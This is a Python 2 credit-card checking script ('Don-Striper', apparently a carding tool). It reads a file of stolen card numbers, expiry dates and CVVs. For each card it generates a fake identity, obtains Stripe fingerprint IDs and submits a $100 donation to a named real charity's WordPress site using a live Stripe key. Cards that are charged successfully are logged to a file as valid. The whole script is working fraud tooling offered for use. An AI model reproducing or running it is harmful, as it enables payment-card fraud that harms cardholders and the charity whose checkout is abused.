#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Coded By SirBugs
#Don't Change copyright Mother Fucker
#Egyptian Coderz

import os
import sys
import time
import requests
from colorama import Fore
from colorama import init
init(autoreset=True)

YELLOW = Fore.YELLOW
RED    = Fore.RED
GREEN  = Fore.GREEN

def CC(CC):

	# // Splitting Your Data:
	# // 5311087139741102|07|25|000
	cc, mm, yy, cvv = CC.split('|')

	# // First Request: Getting Billing Info.
	# ///////////////////////////////////////////////
	while 1:
		r = requests.get('https://randomuser.me/api?results=1&gender=male&password=upper,lower,12&exc=register,picture,id&nat=US')
		src = r.content
		# // print src
		try:
			first    = src.split('"first":"')[1].split('"')[0]
			last     = src.split('"last":"')[1].split('"')[0]
			fullname = first + ' ' + last
			email    = str(first) + str(last) + '@outlook.com'
			break
		except:
			pass
	# ///////////////////////////////////////////////

	# // Second Request: Getting UUIDs.
	# ///////////////////////////////////////////////
	cookies = {'content-type':'application/x-www-form-urlencoded'}

	headers = {
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Pragma":"no-cache",
		"Accept":"*/*",
	}

	while 1:
		r = requests.post('https://m.stripe.com/6', headers=headers, cookies=cookies)
		src = r.content

		try:
			Muid = src.split('"muid":"')[1].split('"')[0]
			Guid = src.split('"guid":"')[1].split('"')[0]
			Sid  = src.split('"sid":"')[1].split('"')[0]
			break
		except:
			pass
	# ///////////////////////////////////////////////

	# // Third Request: Submitting Donation.
	# ///////////////////////////////////////////////
	cookies = {
		"content-type":"application/x-www-form-urlencoded",
		"user-agent":"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
	}
	data = {
		"action": "asp_pp_req_token",
		"amount": "100",
		"curr": "USD",
		"product_id": "330",
		"quantity": "1",
		"billing_details": {"name":str(first)+' '+str(last),"email":str(email)},
	}

	while 1:
		r = requests.post('https://elevatedbygrace.org/wp-admin/admin-ajax.php', data=data, cookies=cookies)
		src = r.content

		try:
			client_secret = src.split('"clientSecret":"')[1].split('"')[0]
			pi_id         = src.split('"pi_id":"')[1].split('"')[0]
			break
		except:
			pass
	# ///////////////////////////////////////////////

	# // Fourth Request: Stripe Final.
	# ///////////////////////////////////////////////
	data = {
		"save_payment_method":"true",
		"setup_future_usage":"off_session",
		"payment_method_data[type]":"card",
		"payment_method_data[billing_details][name]":fullname,
		"payment_method_data[billing_details][email]":email,
		"payment_method_data[card][number]":str(cc),
		"payment_method_data[card][cvc]":str(cvv),
		"payment_method_data[card][exp_month]":str(mm),
		"payment_method_data[card][exp_year]":str(yy),
		"payment_method_data[guid]":Guid,
		"payment_method_data[muid]":Muid,
		"payment_method_data[sid]":Sid,
		"payment_method_data[pasted_fields]":"number",
		"payment_method_data[payment_user_agent]":"stripe.js%2F3c236fed%3B+stripe-js-v3%2F3c236fed",
		"payment_method_data[time_on_page]":"40371",
		"payment_method_data[referrer]":"https%3A%2F%2Felevatedbygrace.org%2F%3Fasp_action%3Dshow_pp%26product_id%3D330",
		"expected_payment_method_type":"card",
		"use_stripe_sdk":"true",
		"key":"pk_live_Alme0DgBmyGhR4EGURpxR0Xy",
		"client_secret":client_secret,
	}
	cookies = {"content-type":"application/x-www-form-urlencoded",}
	headers = {
		"accept": "application/json",
		"accept-encoding": "gzip, deflate, br",
		"accept-language": "en-US,en;q=0.9",
		"content-length": "1012",
		"content-type":	"application/x-www-form-urlencoded",
		"origin": "https://js.stripe.com",
		"referer": "https://js.stripe.com/v3/controller-52375fd2df5c19565f60d66a345a1bff.html",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-site",
		"user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like	Gecko) Chrome/84.0.4147.89 Safari/537.36",
		}

	r = requests.post('https://api.stripe.com/v1/payment_intents/'+pi_id+'/confirm', data=data, headers=headers, cookies=cookies)

	if '"status" : "succeeded"' in r.content:
		print '\t{} --| {} --> {}[Succeed]'.format(YELLOW, CC, GREEN)
		file = open('TargetCards.txt', 'a+')
		file.write(CC+'\n')
		file.close()
	elif '"card_declined"' in r.content:
		print '\t{} --| {} --> {}[Declined]'.format(YELLOW, CC, RED)
	else:
		print '\t{} --| {} --> [UnEXError]'.format(YELLOW, CC)
	# ///////////////////////////////////////////////

print YELLOW + "\t  ____                   ____  _        _                 "; time.sleep(0.1)
print YELLOW + "\t |  _ \  ___  _ __      / ___|| |_ _ __(_)_ __   ___ _ __ "; time.sleep(0.1)
print YELLOW + "\t | | | |/ _ \| '_ \ {}____{}\___ \| __| '__| | '_ \ / _ \ '__|".format(RED, YELLOW); time.sleep(0.1)
print YELLOW + "\t | |_| | (_) | | | |{}_____|{}__) | |_| |  | | |_) |  __/ |   ".format(RED, YELLOW); time.sleep(0.1)
print YELLOW + "\t |____/ \___/|_| |_|    |____/ \__|_|  |_| .__/ \___|_|   "; time.sleep(0.1)
print YELLOW + "\t                                         |_|              "; time.sleep(0.1)
print YELLOW + "\t {}@{}Facebook: {}fb/SirBugs".format(RED, YELLOW, RED); time.sleep(0.1)
print YELLOW + "\t\t {}@{}Telegram: {}SirBugs".format(RED, YELLOW, RED); time.sleep(0.1)
print YELLOW + "\t\t\t {}@{}ICQ: {}SirBugs\n".format(RED, YELLOW, RED); time.sleep(0.1)

ask = raw_input('\t{} --| {}Enter Cardz File {}=> '.format(RED, YELLOW, RED))
print YELLOW + '\n\t ============================================================='; time.sleep(0.1)
print YELLOW + '\t =============================================================\n'

try:
	Cardz = open(ask, 'r').read().split('\n')
except:
	print '\t {}--| {}An Error Occured With Ur File.'.format(RED, YELLOW); time.sleep(5)
	quit()
for Credit in Cardz:
	# // 5311087139741102|07|25|000
	CC(Credit)